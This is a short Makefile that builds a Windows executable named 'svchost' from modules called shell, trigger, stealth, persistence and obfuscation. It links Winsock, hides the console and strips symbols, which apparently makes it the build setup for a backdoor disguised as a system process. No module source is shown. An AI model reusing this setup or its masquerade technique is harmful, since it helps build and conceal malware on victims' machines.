# Executable name
TARGET = svchost

# Folders
SRC_DIR = .
SHELL_DIR = shell
TRIGGER_DIR = trigger
STEALTH_DIR = stealth
PERSISTENCE_DIR = persistence
OBFUSCATION_DIR = obfuscation


# Source files
SRCS = $(SRC_DIR)/main.cpp \
	$(SHELL_DIR)/shell.cpp \
	$(TRIGGER_DIR)/trigger.cpp \
	$(STEALTH_DIR)/stealth.cpp \
	$(PERSISTENCE_DIR)/persistence.cpp \
	$(OBFUSCATION_DIR)/obfuscation.cpp


# Compilation flags
CXX = g++
# Useful warnings + std version
CXXFLAGS = -Wall -Wextra -std=c++17
# Winsock library + remove console + remove debug symboles + statically link the libs
LDFLAGS = -lws2_32 -mwindows -s -static

# Default setting
all: $(TARGET)

$(TARGET): $(SRCS)
	$(CXX) $(CXXFLAGS) $(SRCS) -o $(TARGET) $(LDFLAGS)

clean:
	del /Q $(TARGET).exe 2>nul || true